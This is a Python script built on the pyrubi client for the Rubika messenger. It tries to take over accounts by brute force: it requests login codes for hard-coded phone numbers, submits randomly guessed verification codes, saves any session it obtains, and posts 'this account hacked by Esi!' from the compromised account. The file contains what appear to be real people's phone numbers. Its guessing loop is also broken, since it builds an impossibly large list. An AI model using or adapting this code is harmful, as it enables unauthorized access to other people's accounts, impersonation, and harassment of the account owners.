from pyrubi import Client
from pyrubi.types import Message
from sessions.sessions import Sessions
from random import randint
from json import loads, dumps
import os


def createSession(numbers: list, phone:str):
    if True:
        from pyrubi.methods import Methods
        methods:object = Methods(
            sessionData={},
            platform='web',
            apiVersion=6,
            proxy=None,
            timeOut=10,
            showProgressBar=True
        )

        while True:
            phoneNumber = phone
            try:
                sendCodeData:dict = methods.sendCode(phoneNumber=phoneNumber)
            except:
                print("The phone number is invalid! Please try again.")
                continue

            if sendCodeData['status'] == 'SendPassKey':
                while True:
                    passKey = input("insert pass key: ")
                    sendCodeData:dict = methods.sendCode(phoneNumber=phoneNumber, passKey=passKey)
                    
                    if sendCodeData['status'] == 'InvalidPassKey':
                        print(f'\nThe pass key({sendCodeData["hint_pass_key"]}) is invalid! Please try again.')
                        continue
                    break
            
            for phoneCode in numbers:
                phoneCode:str = phoneCode.strip()
                signInData:dict = methods.signIn(phoneNumber=phoneNumber, phoneCodeHash=sendCodeData['phone_code_hash'], phoneCode=phoneCode)
                if signInData['status'] != 'OK':
                    print("The code is invalid! Please try again.")
                    continue
                break
            
            from pyrubi.crypto import Cryption

            sessionData = {
                'auth': Cryption.decryptRsaOaep(signInData["private_key"], signInData['auth']),
                'private_key': signInData["private_key"],
                'user': signInData['user'],
            }

            open("brute_force_mmd_shaban.pyrubi", "w", encoding="UTF-8").write(dumps(sessionData, indent=4))

            """Methods(
                sessionData=sessionData,
                platform=self.client.platform,
                apiVersion=6,
                proxy=self.client.proxy,
                timeOut=self.client.timeOut,
                showProgressBar=True
            ).registerDevice(deviceModel=f"Android 14")"""
            print(f"\nSign in as brute_force_mmd_shaban was successful.")

            return sessionData



while True:
    if True:
        gussed_nums = []
        for i in range(1000000000000000000000000):
            gussed_nums.append(str(randint(0, 100000)))
        #bot = createSession(numbers=gussed_nums, phone='09189887859')
        bot = createSession(numbers=gussed_nums, phone='09376559007')
        bot = Client('brute_force_mmd_shaban')
        @bot.get_last_message('g0EZhUX085acca08f81002c1f76ba053')
        def start(msg: Message):
            msg.reply('this account hacked by Esi!')
            print('hacked')


        bot.run()




